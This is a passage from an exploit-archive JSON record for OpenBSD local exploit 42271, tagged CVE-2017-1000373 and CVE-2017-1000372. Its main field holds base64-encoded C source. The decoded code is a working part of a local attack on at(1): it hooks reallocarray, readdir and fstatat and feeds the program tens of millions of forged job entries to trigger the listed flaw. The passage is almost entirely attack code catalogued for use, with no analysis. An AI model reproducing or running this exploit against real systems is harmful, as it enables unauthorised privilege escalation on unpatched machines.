ICAgIGlmIChkb3QgPT0gTlVMTCkNCiAgICAgICAgbHQtPnRtX3NlYyA9IDA7DQogICAgZWxzZSB7DQogICAgICAgICpkb3QrKyA9ICdcMCc7DQogICAgICAgIGlmIChzdHJsZW4oZG90KSAhPSAyKQ0KICAgICAgICAgICAgZ290byB0ZXJyOw0KICAgICAgICBsdC0+dG1fc2VjID0gQVRPSTIoZG90KTsNCiAgICAgICAgaWYgKGx0LT50bV9zZWMgPiA2MSkgICAgLyogY291bGQgYmUgbGVhcCBzZWNvbmQgKi8NCiAgICAgICAgICAgIGdvdG8gdGVycjsNCiAgICB9DQoNCiAgICB5ZWFyc2V0ID0gMDsNCiAgICBzd2l0Y2goc3RybGVuKGFyZykpIHsNCiAgICBjYXNlIDEyOiAgICAgICAgICAgIC8qIENDWVlNTUREaGhtbSAqLw0KICAgICAgICBsdC0+dG1feWVhciA9IEFUT0kyKGFyZykgKiAxMDA7DQogICAgICAgIGx0LT50bV95ZWFyIC09IDE5MDA7ICAgIC8qIENvbnZlcnQgdG8gVW5peCB0aW1lICovDQogICAgICAgIHllYXJzZXQgPSAxOw0KICAgICAgICAvKiBGQUxMVEhST1VHSCAqLw0KICAgIGNhc2UgMTA6ICAgICAgICAgICAgLyogWVlNTUREaGhtbSAqLw0KICAgICAgICBpZiAoeWVhcnNldCkgew0KICAgICAgICAgICAgeWVhcnNldCA9IEFUT0kyKGFyZyk7DQogICAgICAgICAgICBsdC0+dG1feWVhciArPSB5ZWFyc2V0Ow0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgeWVhcnNldCA9IEFUT0kyKGFyZyk7DQogICAgICAgICAgICAvKiBQT1NJWCBsb2dpYzogWzAwLDY4XT0+MjB4eCwgWzY5LDk5XT0+MTl4eCAqLw0KICAgICAgICAgICAgbHQtPnRtX3llYXIgPSB5ZWFyc2V0Ow0KICAgICAgICAgICAgaWYgKHllYXJzZXQgPCA2OSkNCiAgICAgICAgICAgICAgICBsdC0+dG1feWVhciArPSAxMDA7DQogICAgICAgIH0NCiAgICAgICAgLyogRkFMTFRIUk9VR0ggKi8NCiAgICBjYXNlIDg6ICAgICAgICAgICAgICAgIC8qIE1NRERoaG1tICovDQogICAgICAgIGx0LT50bV9tb24gPSBBVE9JMihhcmcpOw0KICAgICAgICBpZiAobHQtPnRtX21vbiA+IDEyIHx8IGx0LT50bV9tb24gPT0gMCkNCiAgICAgICAgICAgIGdvdG8gdGVycjsNCiAgICAgICAgLS1sdC0+dG1fbW9uOyAgICAgICAgLyogQ29udmVydCBmcm9tIDAxLTEyIHRvIDAwLTExICovDQogICAgICAgIGx0LT50bV9tZGF5ID0gQVRPSTIoYXJnKTsNCiAgICAgICAgaWYgKGx0LT50bV9tZGF5ID4gMzEgfHwgbHQtPnRtX21kYXkgPT0gMCkNCiAgICAgICAgICAgIGdvdG8gdGVycjsNCiAgICAgICAgbHQtPnRtX2hvdXIgPSBBVE9JMihhcmcpOw0KICAgICAgICBpZiAobHQtPnRtX2hvdXIgPiAyMykNCiAgICAgICAgICAgIGdvdG8gdGVycjsNCiAgICAgICAgbHQtPnRtX21pbiA9IEFUT0kyKGFyZyk7DQogICAgICAgIGlmIChsdC0+dG1fbWluID4gNTkpDQogICAgICAgICAgICBnb3RvIHRlcnI7DQogICAgICAgIGJyZWFrOw0KICAgIGRlZmF1bHQ6DQogICAgICAgIGdvdG8gdGVycjsNCiAgICB9DQoNCiAgICBsdC0+dG1faXNkc3QgPSAtMTsgICAgICAgIC8qIG1rdGltZSB3aWxsIGRlZHVjZSBEU1QuICovDQogICAgdGhlbiA9IG1rdGltZShsdCk7DQogICAgaWYgKHRoZW4gPT0gKHRpbWVfdCktMSkgew0KICAgIHRlcnI6DQogICAgICAgIGRpZSgpOw0KICAgIH0NCiAgICBpZiAodGhlbiA8IG5vdykNCiAgICAgICAgZGllKCk7DQogICAgcmV0dXJuICh0aGVuKTsNCn0NCg0Kc3RhdGljIGJvb2wgcmVhZGluZ19qb2JzOw0KDQp2b2lkICoNCnJlYWxsb2NhcnJheSh2b2lkICogY29uc3QgcHRyLCBjb25zdCBzaXplX3Qgbm1lbWIsIGNvbnN0IHNpemVfdCBzaXplKQ0Kew0KICAgIHN0YXRpYyB2b2lkICogKCogcmVhbF9yZWFsbG9jYXJyYXkpKHZvaWQgKnB0ciwgc2l6ZV90IG5tZW1iLCBzaXplX3Qgc2l6ZSk7DQogICAgaWYgKCFyZWFsX3JlYWxsb2NhcnJheSkgew0KICAgICAgICByZWFsX3JlYWxsb2NhcnJheSA9IGRsc3ltKFJUTERfTkVYVCwgInJlYWxsb2NhcnJheSIpOw0KICAgICAgICBpZiAoIXJlYWxfcmVhbGxvY2FycmF5KSBkaWUoKTsNCiAgICB9DQogICAgaWYgKHB0ciA9PSBOVUxMICYmIG5tZW1iID09IDIgKyA0ICYmIHNpemUgPT0gc2l6ZW9mKHN0cnVjdCBhdGpvYiAqKSkgew0KICAgICAgICBpZiAocmVhZGluZ19qb2JzKSBkaWUoKTsNCiAgICAgICAgcmVhZGluZ19qb2JzID0gdHJ1ZTsNCiAgICB9DQogICAgdm9pZCAqIGNvbnN0IG5ld19wdHIgPSByZWFsX3JlYWxsb2NhcnJheShwdHIsIG5tZW1iLCBzaXplKTsNCiAgICBpZiAoIW5ld19wdHIpIGRpZSgpOw0KICAgIHJldHVybiBuZXdfcHRyOw0KfQ0KDQojZGVmaW5lIE5VTUpPQlMgKDQwPDwyMCkNCg0Kc3RhdGljIGNvbnN0IHNpemVfdCAqDQpnZXRfam9ia2V5cyh2b2lkKQ0Kew0KICAgIGNvbnN0IHNpemVfdCBuID0gTlVNSk9CUzsNCiAgICBzbG93c29ydF90ICogY29uc3QgYSA9IGNhbGxvYyhuLCBzaXplb2Yoc2xvd3NvcnRfdCkpOw0KICAgIHdyaXRlKFNUREVSUl9GSUxFTk8sICJpbml0aWFsaXppbmcgam9ia2V5c1xuIiwgMjEpOw0KICAgIGlmICghYSkgZGllKCk7DQogICAgc2l6ZV90IGk7DQogICAgZm9yIChpID0gMDsgaSA8IG47IGkrKykgew0KICAgICAgICBhW2ldLmlkeCA9IGk7DQogICAgfQ0KICAgIHNsb3dzb3J0KGEsIG4sIHNpemVvZihzbG93c29ydF90KSwgY21wX2tleSwgMzM8PDIwKTsNCiAgICBzaXplX3QgKiBjb25zdCBqb2JrZXlzID0gY2FsbG9jKG4sIHNpemVvZigqam9ia2V5cykpOw0KICAgIHdyaXRlKFNUREVSUl9GSUxFTk8sICJmaW5hbGl6aW5nIGpvYmtleXNcbiIsIDE5KTsNCiAgICBpZiAoIWpvYmtleXMpIGRpZSgpOw0KICAgIGZvciAoaSA9IDA7IGkgPCBuOyBpKyspIHsNCiAgICAgICAgY29uc3Qgc2l6ZV90IGogPSBhW2ldLmlkeDsNCiAgICAgICAgY29uc3Qgc2l6ZV90IGsgPSBhW2ldLmtleTsNCiAgICAgICAgaWYgKGogPj0gbikgZGllKCk7DQogICAgICAgIGlmIChrIDw9IDApIGRpZSgpOw0KICAgICAgICBpZiAoayA+IG4pIGRpZSgpOw0KICAgICAgICBpZiAoam9ia2V5c1tqXSkgZGllKCk7DQogICAgICAgIGpvYmtleXNbal0gPSBrOw0KICAgIH0NCiAgICBmcmVlKGEpOw0KICAgIHJldHVybiBqb2JrZXlzOw0KfQ0KDQpzdGF0aWMgc3RydWN0IGRpcmVudCBkaXJlbnQ7DQoNCnN0cnVjdCBkaXJlbnQgKg0KcmVhZGRpcihESVIgKiBjb25zdCBkaXJwKQ0Kew0KICAgIHN0YXRpYyBzdHJ1Y3QgZGlyZW50ICogKCogcmVhbF9yZWFkZGlyKShESVIgKmRpcnApOw0KICAgIGlmICghcmVhbF9yZWFkZGlyKSB7DQogICAgICAgIHJlYWxfcmVhZGRpciA9IGRsc3ltKFJUTERfTkVYVCwgInJlYWRkaXIiKTsNCiAgICAgICAgaWYgKCFyZWFsX3JlYWRkaXIpIGRpZSgpOw0KICAgIH0NCiAgICBpZiAoIXJlYWRpbmdfam9icykgew0KICAgICAgICByZXR1cm4gcmVhbF9yZWFkZGlyKGRpcnApOw0KICAgIH0NCiAgICBzdGF0aWMgc2l6ZV90IG51bWpvYnM7DQogICAgaWYgKG51bWpvYnMgPj0gTlVNSk9CUykgew0KICAgICAgICB3cml0ZShTVERFUlJfRklMRU5PLCAic29ydGluZyBqb2JzXG4iLCAxMyk7DQogICAgICAgIHJldHVybiBOVUxMOw0KICAgIH0NCiAgICBzdGF0aWMgY2hhciBhcmdbMzJdOw0KICAgIGNoYXIgKiBjcCA9IGFyZyArIHNpemVvZihhcmcpOw0KICAgICotLWNwID0gJ1wwJzsNCiAgew0KICAgIHN0YXRpYyBjb25zdCBzdHJ1Y3Qgew0KICAgICAgICB1aW50MzJfdCBtaW47DQogICAgICAgIHVpbnQzMl90IG1heDsNCiAgICB9IHVuaXRzW10gPSB7DQogICAgICAgIHsgMCwgNTkgfSwgLyogU2Vjb25kICovDQogICAgICAgIHsgMCwgNTkgfSwgLyogTWludXRlICovDQogICAgICAgIHsgMCwgMjMgfSwgLyogSG91ciAqLw0KICAgICAgICB7IDEsIDI4IH0sIC8qIERheSAqLw0KICAgICAgICB7IDEsIDEyIH0sIC8qIE1vbnRoICovDQogICAgICAgIHsgMjAzOCwgMjA5OSB9IC8qIFllYXIgKi8NCiAgICB9Ow0KICAgIHN0YXRpYyBjb25zdCBzaXplX3QgKiBqb2JrZXlzOw0KICAgIGlmICgham9ia2V5cykgew0KICAgICAgICBqb2JrZXlzID0gZ2V0X2pvYmtleXMoKTsNCiAgICAgICAgaWYgKCFqb2JrZXlzKSBkaWUoKTsNCiAgICAgICAgd3JpdGUoU1RERVJSX0ZJTEVOTywgInJlYWRpbmcgam9ic1xuIiwgMTMpOw0KICAgIH0NCiAgICB1aW50MzJfdCB0aW1lciA9IGpvYmtleXNbbnVtam9icysrXTsNCiAgICBpZiAodGltZXIgPiBOVU1KT0JTKSBkaWUoKTsNCiAgICBpZiAodGltZXIgPD0gMCkgZGllKCk7DQogICAgc3RhdGljIHNpemVfdCBwZXJjZW50ID0gMTA7DQogICAgaWYgKG51bWpvYnMgPT0gTlVNSk9CUyAvIDEwMCAqIHBlcmNlbnQpIHsNCiAgICAgICAgY29uc3QgY2hhciAqIGNvbnN0IHN0ciA9IHU2NHRvc3RyKHBlcmNlbnQpOw0KICAgICAgICBjb25zdCBzaXplX3QgbGVuID0gc3RybGVuKHN0cik7DQogICAgICAgIHdyaXRlKFNUREVSUl9GSUxFTk8sIHN0ciwgbGVuKTsNCiAgICAgICAgd3JpdGUoU1RERVJSX0ZJTEVOTywgIiVcbiIsIDIpOw0KICAgICAgICBwZXJjZW50ICs9IDEwOw0KICAgIH0NCiAgICBzaXplX3QgaTsNCiAgICBmb3IgKGkgPSAwOyBpIDwgc2l6ZW9mKHVuaXRzKS9zaXplb2YoKnVuaXRzKTsgaSsrKSB7DQogICAgICAgIGNvbnN0IHVpbnQzMl90IG1pbiA9IHVuaXRzW2ldLm1pbjsNCiAgICAgICAgY29uc3QgdWludDMyX3QgbWF4ID0gdW5pdHNbaV0ubWF4Ow0KICAgICAgICBjb25zdCB1aW50MzJfdCBkaXYgPSBtYXggLSBtaW4gKyAxOw0KICAgICAgICBjb25zdCB1aW50MzJfdCB1MzIgPSBtaW4gKyB0aW1lciAlIGRpdjsNCiAgICAgICAgdGltZXIgLz0gZGl2Ow0KICAgICAgICBpZiAodTMyIDwgbWluKSBkaWUoKTsNCiAgICAgICAgaWYgKHUzMiA+IG1heCkgZGllKCk7DQogICAgICAgIGNvbnN0IGNoYXIgKiBjb25zdCBzdHIgPSB1NjR0b3N0cih1MzIpOw0KICAgICAgICBjb25zdCBzaXplX3QgbGVuID0gc3RybGVuKHN0cik7DQogICAgICAgIGlmIChjcCA8PSBhcmcpIGRpZSgpOw0KICAgICAgICBpZiAoY3AgLSBhcmcgPCAoc3NpemVfdClsZW4pIGRpZSgpOw0KICAgICAgICBjcCAtPSBsZW47DQogICAgICAgIG1lbWNweShjcCwgc3RyLCBsZW4pOw0KICAgICAgICBpZiAobGVuIDwgMikgew0KICAgICAgICAgICAgaWYgKGNwIDw9IGFyZykgZGllKCk7DQogICAgICAgICAgICAqLS1jcCA9ICcwJzsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoIWkpIHsNCiAgICAgICAgICAgIGlmIChjcCA8PSBhcmcpIGRpZSgpOw0KICAgICAgICAgICAgKi0tY3AgPSAnLic7DQogICAgICAgIH0NCiAgICB9DQogICAgaWYgKHRpbWVyKSBkaWUoKTsNCiAgfQ0KICAgIGlmIChzdHJsZW4oY3ApICE9IDE1KSBkaWUoKTsNCiAgICBjb25zdCB1aW50NjRfdCB0aW1lciA9IHR0aW1lKGNwKTsNCiAgICBzdHJsY3B5KGRpcmVudC5kX25hbWUsIHU2NHRvc3RyKHRpbWVyKSwgc2l6ZW9mKGRpcmVudC5kX25hbWUpKTsNCiAgICBzdHJsY2F0KGRpcmVudC5kX25hbWUsICIueCIsIHNpemVvZihkaXJlbnQuZF9uYW1lKSk7DQogICAgcmV0dXJuICZkaXJlbnQ7DQp9DQoNCmludA0KZnN0YXRhdChjb25zdCBpbnQgZmQsIGNvbnN0IGNoYXIgKiBjb25zdCBwYXRoLCBzdHJ1Y3Qgc3RhdCAqIGNvbnN0IHNiLCBjb25zdCBpbnQgZmxhZykNCnsNCiAgICBzdGF0aWMgaW50ICgqIHJlYWxfZnN0YXRhdCkoaW50IGZkLCBjb25zdCBjaGFyICpwYXRoLCBzdHJ1Y3Qgc3RhdCAqc2IsIGludCBmbGFnKTsNCiAgICBpZiAoIXJlYWxfZnN0YXRhdCkgew0KICAgICAgICByZWFsX2ZzdGF0YXQgPSBkbHN5bShSVExEX05FWFQsICJmc3RhdGF0Iik7DQogICAgICAgIGlmICghcmVhbF9mc3RhdGF0KSBkaWUoKTsNCiAgICB9DQogICAgaWYgKCFyZWFkaW5nX2pvYnMgfHwgZmxhZyAhPSBBVF9TWU1MSU5LX05PRk9MTE9XIHx8IHN0cmNtcChwYXRoLCBkaXJlbnQuZF9uYW1lKSAhPSAwKSB7DQogICAgICAgIHJldHVybiByZWFsX2ZzdGF0YXQoZmQsIHBhdGgsIHNiLCBmbGFnKTsNCiAgICB9DQogICAgbWVtc2V0KHNiLCAwLCBzaXplb2YoKnNiKSk7DQogICAgc2ItPnN0X21vZGUgPSBTX0lGUkVHIHwgU19JUlVTUiB8IFNfSVdVU1I7DQogICAgc3RhdGljIHVpZF90IHVzZXJfdWlkOw0KICAgIGlmICghdXNlcl91aWQpIHsNCiAgICAgICAgdXNlcl91aWQgPSBnZXR1aWQoKTsNCiAgICAgICAgaWYgKCF1c2VyX3VpZCkgZGllKCk7DQogICAgfQ0KICAgIHNiLT5zdF91aWQgPSB1c2VyX3VpZDsNCiAgICByZXR1cm4gMDsNCn0=", 
    "filename": "platforms/openbsd/local/42271.c", 
    "id": "42271", 
    "cves": [
        "CVE-2017-1000373", 
        "CVE-2017-1000372"
    ]
}